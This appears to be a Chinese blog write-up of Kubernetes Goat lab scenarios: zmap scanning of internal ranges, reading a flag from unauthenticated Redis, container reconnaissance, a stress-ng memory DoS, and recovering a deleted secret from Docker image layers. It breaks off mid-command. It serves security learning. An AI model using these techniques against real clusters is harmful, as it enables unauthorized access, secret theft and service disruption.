+<p>启动环境</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl run --rm -it hacker-container --image=madhuakula/hacker-container -- sh</span><br></pre></td></tr></table></figure>
+
+<p>先编辑<code>vi /etc/zmap/blacklist.conf</code>，注释里面的<code>10.0.0.0/8</code>这一行，不然不能扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zmap -p 6379 10.0.0.0/8 -o results.csv</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">~ # ifconfig </span><br><span class="line">eth0      Link encap:Ethernet  HWaddr 76:20:B2:1E:01:E8  </span><br><span class="line">          inet addr:10.244.1.31  Bcast:10.244.1.255  Mask:255.255.255.0</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1450  Metric:1</span><br><span class="line">          RX packets:2583424 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:22995250 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:0 </span><br><span class="line">          RX bytes:181718935 (173.2 MiB)  TX bytes:1229657656 (1.1 GiB)</span><br><span class="line"></span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:0 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)</span><br><span class="line"></span><br><span class="line">~ # cat results.csv | grep 10.244</span><br><span class="line">10.244.1.5</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">~ # redis-cli -h 10.244.1.5</span><br><span class="line">10.244.1.5:6379&gt; KEYS *</span><br><span class="line">1) &quot;SECRETSTUFF&quot;</span><br><span class="line">10.244.1.5:6379&gt; GET SECRETSTUFF</span><br><span class="line">&quot;k8s-goat-a5a3e446faafa9d0514b3ff396ab8a40&quot;</span><br></pre></td></tr></table></figure>
+
+<p>这其实在现实中就是redis未授权访问，Redis服务器假如以root身份运行，黑客就能够给root账户写入SSH公钥文件，然后直接通过SSH登录目标受害的服务器</p>
+<h1 id="获取环境信息"><a href="#获取环境信息" class="headerlink" title="获取环境信息"></a>获取环境信息</h1><p>通过/proc/self/cgroup 文件可以获取到docker容器的id</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@nsfocus:/home# cat /proc/self/cgroup  </span><br><span class="line">12:blkio:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br><span class="line">11:pids:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br><span class="line">10:rdma:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br><span class="line">9:devices:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br><span class="line">8:freezer:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br><span class="line">7:perf_event:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br><span class="line">6:cpuset:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br><span class="line">5:hugetlb:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br><span class="line">4:memory:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br><span class="line">3:net_cls,net_prio:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br><span class="line">2:cpu,cpuacct:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br><span class="line">1:name=systemd:/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br><span class="line">0::/kubepods.slice/kubepods-pod081f809d_8199_44bd_8f86_ac6942df3dc8.slice/docker-5702cc4cdd60529077900ade9f40bd131b05e814893487dd94b8084aebd0aac0.scope</span><br></pre></td></tr></table></figure>
+
+<p>可以通过在node执行ps看到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker ps -a | grep 5702</span><br><span class="line">5702cc4cdd60   madhuakula/k8s-goat-system-monitor                    &quot;gotty -w bash&quot;          6 days ago     Up 6 days                           k8s_system-monitor_system-monitor-deployment-594c89b48f-97rs9_default_081f809d-8199-44bd-8f86-ac6942df3dc8_0</span><br></pre></td></tr></table></figure>
+
+<p>其他的信息收集</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/self/cgroup</span><br><span class="line">cat /etc/hosts</span><br><span class="line"># 挂载信息</span><br><span class="line">mount</span><br><span class="line"># 查看文件系统</span><br><span class="line">ls -la /home/</span><br><span class="line">printenv或者直接env</span><br></pre></td></tr></table></figure>
+
+<p>在环境变量中就有flag了</p>
+<p><img src="http://pic.giantbranch.cn/pic/1655868160342.png" alt></p>
+<h1 id="DOS内存或CPU等资源"><a href="#DOS内存或CPU等资源" class="headerlink" title="DOS内存或CPU等资源"></a>DOS内存或CPU等资源</h1><p>假如Kubernetes部署的yaml文件没有对资源的使用进行限制，那么攻击者可能就可以消耗pod/deployment的资源，从而对Kubernetes造成DOS</p>
+<p>这里使用stress-ng压力测试程序来测试</p>
+<p>先看看初始资源占用情况，cpu是0，内存是不超过10M</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker stats --no-stream | grep hunger</span><br><span class="line">842e3f0c146a   k8s_hunger-check_hunger-check-deployment-56d65977f6-k68g9_big-monolith_8bd7722d-bdf5-4230-9265-1447b8317e0d_0              0.00%     6.609MiB / 15.64GiB   0.04%     0B / 0B   0B / 0B          8</span><br><span class="line">302af9807534   k8s_POD_hunger-check-deployment-56d65977f6-k68g9_big-monolith_8bd7722d-bdf5-4230-9265-1447b8317e0d_0                       0.00%     1.227MiB / 15.64GiB   0.01%     0B / 0B   0B / 0B          1</span><br></pre></td></tr></table></figure>
+
+<p>执行下面命令进行压力测试，–vm是启动8个worker去匿名mmap，–vm-bytes是每个worker分配的内存，但是我设置2G发现16内存没用满，只用了2-3G，所以索性改为16G，最后–timeout就是压力测试60s后停止</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stress-ng --vm 8 --vm-bytes 16G --timeout 60s</span><br></pre></td></tr></table></figure>
+
+<p>下面是压力测试中在node执行htop的截图</p>
+<p><img src="http://pic.giantbranch.cn/pic/1655884111674.png" alt></p>
+<p>在node执行<code>docker stats  | grep hunger</code>，到后面直接就获取不了</p>
+<p><img src="http://pic.giantbranch.cn/pic/1655884216613.png" alt></p>
+<p>这样可能会使其他pod可能无法获得执行的资源，无法处理用户请求或者超级卡顿，假如是自己的服务器可能消耗更多的电费，假如是云服务则可能需要支付更加昂贵的账单。</p>
+<p>我们查看一下部署的yaml文件，可以看到资源限制是被注释掉的，不过1000G跟没限制也差不多了</p>
+<p><img src="http://pic.giantbranch.cn/pic/1655886492294.png" alt></p>
+<h1 id="Hacker-container"><a href="#Hacker-container" class="headerlink" title="Hacker container"></a>Hacker container</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl run -it --rm hacker-container --image=madhuakula/hacker-container -- sh</span><br></pre></td></tr></table></figure>
+
+<p>启动pod后我们可以用amicontained评估容器的权限等信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">~ # amicontained</span><br><span class="line">Container Runtime: docker</span><br><span class="line">Has Namespaces:</span><br><span class="line">	pid: true</span><br><span class="line">	user: false</span><br><span class="line">AppArmor Profile: docker-default (enforce)</span><br><span class="line">Capabilities:</span><br><span class="line">	BOUNDING -&gt; chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap</span><br><span class="line">Seccomp: disabled</span><br><span class="line">Blocked Syscalls (22):</span><br><span class="line">	MSGRCV SYSLOG SETSID VHANGUP PIVOT_ROOT ACCT SETTIMEOFDAY UMOUNT2 SWAPON SWAPOFF REBOOT SETHOSTNAME SETDOMAINNAME INIT_MODULE DELETE_MODULE LOOKUP_DCOOKIE KEXEC_LOAD PERF_EVENT_OPEN FANOTIFY_INIT OPEN_BY_HANDLE_AT FINIT_MODULE KEXEC_FILE_LOAD</span><br><span class="line">Looking for Docker.sock</span><br></pre></td></tr></table></figure>
+
+<p>还可以用里面的nikto进行web漏洞扫描，看着效果不怎么样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">~ # nikto.pl -host http://metadata-db</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          10.105.74.206</span><br><span class="line">+ Target Hostname:    metadata-db</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2022-06-22 08:20:04 (GMT0)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: No banner retrieved</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ No CGI Directories found (use &apos;-C all&apos; to force check all possible dirs)</span><br><span class="line">+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.</span><br><span class="line">+ 7373 requests: 0 error(s) and 4 item(s) reported on remote host</span><br><span class="line">+ End Time:           2022-06-22 08:21:53 (GMT0) (109 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure>
+
+<h1 id="隐藏在镜像层中的信息"><a href="#隐藏在镜像层中的信息" class="headerlink" title="隐藏在镜像层中的信息"></a>隐藏在镜像层中的信息</h1><p>在docker镜像中，很容易可能将密码、私钥、令牌等放入到了镜像中</p>
+<p>作者设计了一个hidden-in-layers的jobs</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl get jobs</span><br><span class="line">NAME               COMPLETIONS   DURATION   AGE</span><br><span class="line">batch-check-job    1/1           36s        6d5h</span><br><span class="line">hidden-in-layers   0/1           6d5h       6d5h</span><br><span class="line">kube-bench-node    1/1           29s        46h</span><br></pre></td></tr></table></figure>
+
+<p>查看部署文件，确认镜像名称</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat ~/kubernetes-goat/scenarios/hidden-in-layers/deployment.yaml | grep image</span><br><span class="line">        image: madhuakula/k8s-goat-hidden-in-layers</span><br></pre></td></tr></table></figure>
+
+<p>到node查看镜像的信息，通过<code>docker inspect</code>可以看到最终执行的cmd命令，但是这样只能看到一个命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$  madhuakula/k8s-goat-hidden-in-layers | grep &quot;Cmd&quot; -A 5</span><br><span class="line">            &quot;Cmd&quot;: null,</span><br><span class="line">            &quot;Image&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Volumes&quot;: null,</span><br><span class="line">            &quot;WorkingDir&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Entrypoint&quot;: null,</span><br><span class="line">            &quot;OnBuild&quot;: null,</span><br><span class="line">--</span><br><span class="line">            &quot;Cmd&quot;: [</span><br><span class="line">                &quot;sh&quot;,</span><br><span class="line">                &quot;-c&quot;,</span><br><span class="line">                &quot;tail -f /dev/null&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;ArgsEscaped&quot;: true,</span><br></pre></td></tr></table></figure>
+
+<p>之前已经用过<code>docker history</code>来看每一层所执行的命令了，这里我们可以看到一个/root/secret.txt的文件，但是在后面删掉了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ docker history --no-trunc madhuakula/k8s-goat-hidden-in-layers</span><br><span class="line">IMAGE                                                                     CREATED        CREATED BY                                                                                                              SIZE      COMMENT</span><br><span class="line">sha256:8944f45111dbbaa72ab62c924b0ae86f05a2e6d5dcf8ae2cc75561773bd68607   5 weeks ago    CMD [&quot;sh&quot; &quot;-c&quot; &quot;tail -f /dev/null&quot;]                                                                                     0B        buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;                                                                 5 weeks ago    RUN /bin/sh -c echo &quot;Contributed by Rewanth Cool&quot; &gt;&gt; /root/contribution.txt     &amp;&amp; rm -rf /root/secret.txt # buildkit   28B       buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;                                                                 5 weeks ago    ADD secret.txt /root/secret.txt # buildkit                                                                              41B       buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;                                                                 5 weeks ago    LABEL MAINTAINER=Madhu Akula INFO=Kubernetes Goat                                                                       0B        buildkit.dockerfile.v0</span><br><span class="line">&lt;missing&gt;                                                                 2 months ago   /bin/sh -c #(nop)  CMD [&quot;/bin/sh&quot;]                                                                                      0B        </span><br><span class="line">&lt;missing&gt;                                                                 2 months ago   /bin/sh -c #(nop) ADD file:5d673d25da3a14ce1f6cf66e4c7fd4f4b85a3759a9d93efb3fd9ff852b5b56e4 in /                        5.57MB</span><br></pre></td></tr></table></figure>
+
+<p>还有一个工具是<code>https://hub.docker.com/r/alpine/dfimage</code>，这个更全面，基于<code>https://github.com/P3GLEG/Whaler</code>进行构建的，可以搜索secret files(通过将image保存到文件，之后解压搜索里面的文件)，打印环境变量（docker inspect获取），具体实现可以查看<code>https://github.com/P3GLEG/Whaler/blob/master/main.go</code>和<code>https://github.com/P3GLEG/Whaler/blob/master/scanner.go</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">$ alias dfimage=&quot;docker run -v /var/run/docker.sock:/var/run/docker.sock --rm alpine/dfimage&quot;</span><br><span class="line">$ dfimage  madhuakula/k8s-goat-hidden-in-layers:latest</span><br><span class="line">Analyzing madhuakula/k8s-goat-hidden-in-layers:latest</span><br><span class="line">Docker Version: </span><br><span class="line">GraphDriver: overlay2</span><br><span class="line">Environment Variables</span><br><span class="line">|PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line"></span><br><span class="line">Image user</span><br><span class="line">|User is root</span><br><span class="line"></span><br><span class="line">Potential secrets:</span><br><span class="line">|Found match etc/apk/keys/alpine-devel@lists.alpinelinux.org-4a6a0840.rsa.pub Possible public key \.pub$ 79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/layer.tar</span><br><span class="line">|Found match etc/apk/keys/alpine-devel@lists.alpinelinux.org-5243ef4b.rsa.pub Possible public key \.pub$ 79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/layer.tar</span><br><span class="line">|Found match etc/apk/keys/alpine-devel@lists.alpinelinux.org-5261cecb.rsa.pub Possible public key \.pub$ 79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/layer.tar</span><br><span class="line">|Found match etc/apk/keys/alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub Possible public key \.pub$ 79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/layer.tar</span><br><span class="line">|Found match etc/apk/keys/alpine-devel@lists.alpinelinux.org-61666e3f.rsa.pub Possible public key \.pub$ 79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/layer.tar</span><br><span class="line">|Found match etc/udhcpd.conf DHCP server configs dhcpd[^ ]*.conf 79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/layer.tar</span><br><span class="line">Dockerfile:</span><br><span class="line">CMD [&quot;/bin/sh&quot;]</span><br><span class="line">LABEL MAINTAINER=Madhu Akula INFO=Kubernetes Goat</span><br><span class="line">ADD secret.txt /root/secret.txt # buildkit</span><br><span class="line">	root/</span><br><span class="line">	root/secret.txt</span><br><span class="line"></span><br><span class="line">RUN RUN echo &quot;Contributed by Rewanth Cool&quot; &gt;&gt; /root/contribution.txt  \</span><br><span class="line">	&amp;&amp; rm -rf /root/secret.txt # buildkit</span><br><span class="line">CMD [&quot;sh&quot; &quot;-c&quot; &quot;tail -f /dev/null&quot;]</span><br></pre></td></tr></table></figure>
+
+<p>可以看到ADD secret.txt /root/secret.txt之后的几行有点异常，不过影响不大</p>
+<p>搜索dfimage的时候，还有一个github上也叫dfimage的可以将镜像还原成一个Dockerfile，是基于docker history，不用我们自己手动还原</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/LanikSJ/dfimage/blob/3d55b88596d5eec8d4beff171ad5d4931043ad19/entrypoint.py#L17</span><br></pre></td></tr></table></figure>
+
+<p><img src="http://pic.giantbranch.cn/pic/1655973767156.png" alt></p>
+<p>执行结果FROM这个输出肯定是不对的了，第二行也看不出什么</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -v /var/run/docker.sock:/var/run/docker.sock dfimage madhuakula/k8s-goat-hidden-in-layers:latest</span><br><span class="line">FROM madhuakula/k8s-goat-hidden-in-layers:latest</span><br><span class="line">ADD file:90e56af13188c7f0283d244a0d70b853d8bef8587a41f1da8eac3a2aba8964ef in /</span><br><span class="line">CMD [&quot;/bin/sh&quot;]</span><br><span class="line">RUN LABEL MAINTAINER=Madhu Akula INFO=Kubernetes Goat</span><br><span class="line">RUN ADD secret.txt /root/secret.txt # buildkit</span><br><span class="line">RUN RUN /bin/sh -c echo &quot;Contributed by Rewanth Cool&quot; &gt;&gt; /root/contribution.txt     \</span><br><span class="line">    &amp;&amp; rm -rf /root/secret.txt # buildkit</span><br><span class="line">RUN CMD [&quot;sh&quot; &quot;-c&quot; &quot;tail -f /dev/null&quot;]</span><br></pre></td></tr></table></figure>
+
+<p>但是这只是让我们看到有这个文件，我们需要看看这个文件，直接启动容器肯定没有，因为已经删掉了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ kubectl run test --rm --restart=Never -it --image=madhuakula/k8s-goat-hidden-in-layers -- sh</span><br><span class="line">If you don&apos;t see a command prompt, try pressing enter.</span><br><span class="line">/ # ls</span><br><span class="line">bin    dev    etc    home   lib    media  mnt    opt    proc   root   run    sbin   srv    sys    tmp    usr    var</span><br><span class="line">/ # cd root/</span><br><span class="line">~ # ls -la</span><br><span class="line">total 16</span><br><span class="line">drwx------    1 root     root          4096 Jun 24 08:33 .</span><br><span class="line">drwxr-xr-x    1 root     root          4096 Jun 24 08:29 ..</span><br><span class="line">-rw-------    1 root     root            19 Jun 24 08:34 .ash_history</span><br><span class="line">-rw-r--r--    1 root     root            28 May 16 20:41 contribution.txt</span><br><span class="line">~ #</span><br></pre></td></tr></table></figure>
+
+<p>但是在删掉的那一层的上一层还有，我们可以先将整个image保存到文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># root @ nsfocus  in ~ [16:35:15]</span><br><span class="line">$ mkdir hidden-in-layers</span><br><span class="line"># root @ nsfocus  in ~ [16:35:24]</span><br><span class="line">$ docker save madhuakula/k8s-goat-hidden-in-layers -o hidden-in-layers/hidden-in-layers.tar</span><br><span class="line"># root @ nsfocus  in ~ [16:35:48]</span><br><span class="line">$ cd hidden-in-layers/</span><br><span class="line"># root @ nsfocus  in ~/hidden-in-layers [16:35:52]</span><br><span class="line">$ tar -xvf hidden-in-layers.tar</span><br><span class="line">66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/</span><br><span class="line">66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/VERSION</span><br><span class="line">66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/json</span><br><span class="line">66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/layer.tar</span><br><span class="line">79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/</span><br><span class="line">79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/VERSION</span><br><span class="line">79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/json</span><br><span class="line">79cf3b8a6b51ac05a78de2a347855d9be39bb7300a6df1a1094cdab616745f78/layer.tar</span><br><span class="line">8944f45111dbbaa72ab62c924b0ae86f05a2e6d5dcf8ae2cc75561773bd68607.json</span><br><span class="line">c8e3854bdc614a630d638b7cb682ed66c824e25b5c7a37cf14c63db658b99723/</span><br><span class="line">c8e3854bdc614a630d638b7cb682ed66c824e25b5c7a37cf14c63db658b99723/VERSION</span><br><span class="line">c8e3854bdc614a630d638b7cb682ed66c824e25b5c7a37cf14c63db658b99723/json</span><br><span class="line">c8e3854bdc614a630d638b7cb682ed66c824e25b5c7a37cf14c63db658b99723/layer.tar</span><br><span class="line">manifest.json</span><br><span class="line">repositories</span><br></pre></td></tr></table></figure>
+
+<p>这里面有3层是有layer.tar文件的，少的时候我们当然可以全部一个一个解压，去找secret.txt</p>
+<p>但是有个工具可以快速确认是哪个id的layer.tar，就是dive</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/wagoodman/dive/releases/download/v0.10.0/dive_0.10.0_linux_amd64.deb</span><br><span class="line">apt install ./dive_0.10.0_linux_amd64.deb</span><br></pre></td></tr></table></figure>
+
+<p>运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dive madhuakula/k8s-goat-hidden-in-layers</span><br></pre></td></tr></table></figure>
+
+<p>通过下图，我们就知道在<code>66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535</code>那里</p>
+<p><img src="http://pic.giantbranch.cn/pic/1656059966822.png" alt></p>
+<p>最终获取到<code>secret.txt</code>文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># root @ nsfocus  in ~/hidden-in-layers [16:39:52]</span><br><span class="line">$ cd 66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/</span><br><span class="line"># root @ nsfocus  in ~/hidden-in-layers/66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535 [16:39:54]</span><br><span class="line">$ ls</span><br><span class="line">json  layer.tar  VERSION</span><br><span class="line"># root @ nsfocus  in ~/hidden-in-layers/66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535 [16:39:55]</span><br><span class="line">$ tar -xf ./layer.tar </span><br><span class="line"># root @ nsfocus  in ~/hidden-in-layers/66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535 [16:40:05]</span><br><span class="line">$ ls</span><br><span class="line">json  layer.tar  root  VERSION</span><br><span class="line"># root @ nsfocus  in ~/hidden-in-layers/66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535 [16:40:07]</span><br><span class="line">$ cd root/</span><br><span class="line"># root @ nsfocus  in ~/hidden-in-layers/66ca4cc4d8d51d6865d9107fc34462e80cf7cf01a3c4f8989ac794dfe95df535/root 